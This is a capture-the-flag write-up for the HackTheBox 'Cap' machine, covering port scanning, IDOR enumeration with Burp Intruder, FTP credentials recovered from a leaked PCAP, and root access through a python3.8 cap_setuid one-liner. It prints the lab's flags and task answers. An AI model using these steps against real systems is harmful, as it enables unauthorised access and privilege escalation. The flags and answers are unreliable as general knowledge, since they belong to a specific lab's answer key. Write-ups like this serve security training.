# 🚩 Cap - Write-up

![Banner](https://github.com/referefz/HTB-Writeups/blob/main/images/Cap/1-banner.png)

## General Information

| Attribute | Details |
| :--- | :--- |
| **Platform** | HackTheBox |
| **Difficulty** | 🟢 Easy |
| **OS** | 🐧 Linux |
| **Mode** | 🧭 Guided Mode |
| **Sections** | [1: Reconnaissance & Enumeration](#-1-reconnaissance--enumeration) <br> [2: Initial Foothold (nathan)](#-2-initial-foothold-nathan) <br> [3: Privilege Escalation (root)](#-3-privilege-escalation-root) <br> [4: Pwn3d !!](#-4-pwn3d-) |
| **Pwn Date** | 2026-06-27 |

---

## Executive Summary

*Hello everyone!! This is Reef the Inquirer✨. Quick and easy! Cap was a straightforward machine that gave me a textbook lesson on danger of cap_setuid capability.*

*A quick `nmap` sweep showed only the classic trio — FTP, SSH and HTTP — and the web app was a slick little "Security Snapshot" dashboard that let the logged-in user `Nathan` download a 5-second PCAP of his own network traffic. Bumping the numeric ID in `/data/{id}` down confirmed an Insecure Direct Object Reference (IDOR), and I let `Burp Suite`'s Intruder chew through a generated wordlist of IDs (`num.txt`) to mechanically prove that only **three** snapshots — `0`, `1` and `2` — actually exist on the server. Capture `0` turned out to be the juicy one: cracking it open in Wireshark handed me Nathan's FTP credentials in cleartext, which doubled as his SSH password too. From there it was a short hop: `getcap` revealed that `/usr/bin/python3.8` had been left with the `cap_setuid` capability, and GTFOBins had the one-liner ready to go — `setuid(0)` and pop straight into a root shell. Clean recon, one IDOR confirmed by fuzzing, one capability misconfig, full system compromise 🚩*

---

## Tools Used

`Your mind and eyes!!`, `Nmap`, `Web Browser (Dashboard/IDOR enumeration)`, `Burp Suite (Intruder)`, `Wireshark`, `FTP`, `SSH`, `getcap`, `GTFOBins`

---

## 🔍 1: Reconnaissance & Enumeration

**Attacker IP:** `10.10.16.167`
**Target IP:** `10.129.52.173`

### 1.1 Port Scanning

```bash
sudo nmap -T4 -p- 10.129.52.173
```

🧐 **Findings:**

```
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

*A nice and tight attack surface — only three ports open. That's a clear hint that the web app on port 80 is going to be the main avenue in, with FTP and SSH waiting in the wings as the eventual landing spots for whatever credentials we dig up.*

* **Port 21 (FTP):** Open and worth revisiting once credentials surface — vsFTPd 3.0.3 was later confirmed via the FTP banner.
* **Port 22 (SSH):** Standard OpenSSH service, the natural target for any creds found elsewhere.
* **Port 80 (HTTP):** A custom dashboard application — this is where the real enumeration begins.

<details>
  <summary>🟢 Task 1: How many TCP ports are open?</summary>
  <br>
  3 (21/ftp, 22/ssh, 80/http)
</details>

### 1.2 Web Dashboard Enumeration

Browsing to `http://10.129.52.173` dropped me straight into a dashboard, logged in as a user called **Nathan**, showing live "Security Events", "Failed Login Attempts" and "Port Scans" widgets.

![Web dashboard - logged in as Nathan](images/web-dashboard.png)

🧐 **Findings:**

The sidebar exposed a feature called **"Security Snapshot (5 Second PCAP + Analysis)"**. Clicking it triggered a capture and redirected the browser to a URL of the form:

```
http://10.129.52.173/data/1
```

…which rendered a small analysis table (Number of Packets, IP Packets, TCP Packets, UDP Packets) for that 5-second capture, with a **Download** button that fetched a numbered file, e.g. `1.pcap`.

![/data/1 snapshot page and 1.pcap download](images/download-snapshot-1.png)

<details>
  <summary>🟢 Task 2: After running a "Security Snapshot", the browser is redirected to a path of the format /[something]/[id], where [id] represents the id number of the scan. What is the [something]?</summary>
  <br>
  data
</details>

The moment I saw a literal incrementing integer sitting in the URL path, alarm bells went off — that's a classic **IDOR** smell, and it deserved a proper, mechanical confirmation rather than just guessing by hand.

---

## 🚪 2: Initial Foothold (nathan)

### 2.1 Confirming the IDOR with Burp Suite Intruder

Before touching anyone else's data, I wanted to *prove* the IDOR systematically instead of just eyeballing it. I generated a wordlist of candidate IDs:

```bash
seq 0 100 > num.txt
```

![Generating num.txt with seq](images/seq-num-txt.png)

I then sent the `/data/1` request to **Burp Suite's Intruder**, marked the numeric ID as the injection point (`/data/§1§`), and loaded `num.txt` as the **Sniper** payload set:

```
GET /data/§1§ HTTP/1.1
Host: 10.129.52.173
```

* **Payload set:** `num.txt` (0–100), one request per line.
* **Attack type:** Sniper (single payload position on the ID).

Running the attack and sorting the results by **response length / status code** made the picture immediately obvious: only three IDs — `0`, `1`, and `2` — returned an HTTP `200` with a populated analysis table and an attached PCAP. Every other ID in the `num.txt` list (3 through 100) came back with an empty/error response, confirming that **the application only ever generated three snapshots in total**, and that all three are reachable by any authenticated session regardless of who actually triggered them. That's the IDOR formally confirmed by fuzzing, not just assumed.

<details>
  <summary>🟢 Task 3: Are you able to get to other users' scans?</summary>
  <br>
  Yes — the <code>/data/{id}</code> endpoint does not validate that the requested snapshot belongs to the current session, so lowering the ID exposes captures generated by other activity on the box (confirmed via Burp Intruder against IDs 0–100 from <code>num.txt</code>, with only 0, 1 and 2 returning valid data).
</details>

### 2.2 Looting the Leaked Snapshots

Pulling up `/data/0` by hand in the browser confirmed the Intruder result — a much bigger capture (72 packets, 69 of them TCP) than my own session's snapshot, and the downloads panel quietly dropped extra files alongside it: `0.pcap`, `1.pcap`, `2.pcap`, and even a couple of OpenVPN config files (`machines_eu-5.ovpn`, `machines_us-2.ovpn`).

![/data/0 revealing extra files: 0.pcap, 1.pcap, 2.pcap, .ovpn configs](images/data-0-downloads.png)

<details>
  <summary>🟢 Task 4: What is the ID of the PCAP file that contains sensitive data?</summary>
  <br>
  0 (<code>/data/0</code> → <code>0.pcap</code>)
</details>

Opening `0.pcap` in Wireshark and filtering for interesting traffic immediately surfaced a full FTP login exchange in plaintext — protocols don't get more "credentials in the clear" than legacy FTP:

![FTP credentials captured in Wireshark](images/ftp-creds-wireshark.png)

```
USER nathan
PASS Buck3tH4TF0RM3!
230 Login successful.
```

<details>
  <summary>🟢 Task 5: Which application layer protocol in the pcap file can the sensitive data be found in?</summary>
  <br>
  FTP
</details>

So!! Easy as that — a leaked PCAP from the "secure" dashboard handed me a full set of valid credentials for the user `nathan`. Time to put them to use.

### 2.3 FTP & SSH Access as nathan

```bash
sudo ftp 10.129.52.173
Name (10.129.52.173:kali): nathan
Password: Buck3tH4TF0RM3!
230 Login successful.
ftp> pwd
Remote directory: /home/nathan
ftp> ls
-r--------   1 1001     1001           33 Jun 27 06:29 user.txt
```

![FTP login as nathan, listing user.txt](images/ftp-login.png)

```bash
ftp> get user.txt
226 Transfer complete.
33 bytes received in 00:00 (0.08 KiB/s)
```

![Downloading user.txt via FTP](images/ftp-get-user-flag.png)

```bash
cat user.txt
33b67b0ee0aca2c5ebe6b35ae82c23b7
```

![Reading the user flag](images/user-flag-cat.png)

**🚩 User flag secured!**

<details>
  <summary>🟢 Submit User Flag: Submit the flag located in the nathan user's home directory.</summary>
  <br>
  33b67b0ee0aca2c5ebe6b35ae82c23b7
</details>

Since the same credentials are very often reused across services on these boxes, I went straight for SSH instead of staying stuck in FTP:

```bash
sudo ssh nathan@10.129.52.173
nathan@10.129.52.173's password: Buck3tH4TF0RM3!
Welcome to Ubuntu 20.04.2 LTS
nathan@cap:~$
```

![SSH login as nathan with the leaked FTP password](images/ssh-login.png)

<details>
  <summary>🟢 Task 6: We've managed to collect nathan's FTP password. On what other service does this password work?</summary>
  <br>
  SSH
</details>

🚀 Full interactive shell as `nathan` — onward to root!

---

## 👑 3: Privilege Escalation (root)

Current User: `nathan`

Target User: `root`

With a proper shell in hand, the very first thing I check on any Linux box is binary capabilities — they're a goldmine that's just as juicy as SUID but far less commonly audited:

```bash
nathan@cap:~$ getcap -r / 2>/dev/null
```

🧐 **Findings:**

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

![getcap -r / output highlighting python3.8](images/getcap-output.png)

* **`cap_setuid` on `/usr/bin/python3.8`:** This is the prize. With the `cap_setuid` capability attached directly to the Python 3.8 interpreter, *any* process spawned by it can call `setuid(0)` and become root — no sudo, no SUID bit, no password needed. It's effectively root-in-a-box for anyone who can run that binary.

<details>
  <summary>🟢 Task 8: What is the full path to the binary on this machine that has special capabilities that can be abused to obtain root privileges?</summary>
  <br>
  /usr/bin/python3.8
</details>

A quick check on GTFOBins confirmed the exact one-liner for exploiting capabilities on Python:

![GTFOBins python capabilities entry](images/gtfobins-python.png)

```bash
python -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
```

Running it against the capability-flagged interpreter:

```bash
nathan@cap:~$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
# whoami
root
# pwd
/home/nathan
# cd /root
# cat root.txt
882b29cc76af6730db771d1a589c21bf
```

💥 **Root achieved!**

![Root shell and root flag](images/root-flag.png)

<details>
  <summary>🟢 Submit Root Flag: Submit the flag located in root's home directory.</summary>
  <br>
  882b29cc76af6730db771d1a589c21bf
</details>

---

## 🏁 4: Pwn3d !!

**🚩 User Flag:** `33b67b0ee0aca2c5ebe6b35ae82c23b7`

**🚩 Root Flag:** `882b29cc76af6730db771d1a589c21bf`

Two clean misconfigurations chained together a full box compromise here. We should always validate object ownership server-side instead of trusting a client-supplied numeric ID — IDOR bugs like this one (so easily confirmed with a simple Burp Intruder sweep over a generated wordlist) turn a "personal" feature into an open archive. We should also never run legacy, plaintext-credential protocols like FTP in production, and any Linux capability as powerful as `cap_setuid` should be audited and stripped from interpreters or any general-purpose binary the moment it's no longer strictly required.

![Pwn3d](images/pwn3d.png)

Created with 💜 by **The Inquirer, Reef**
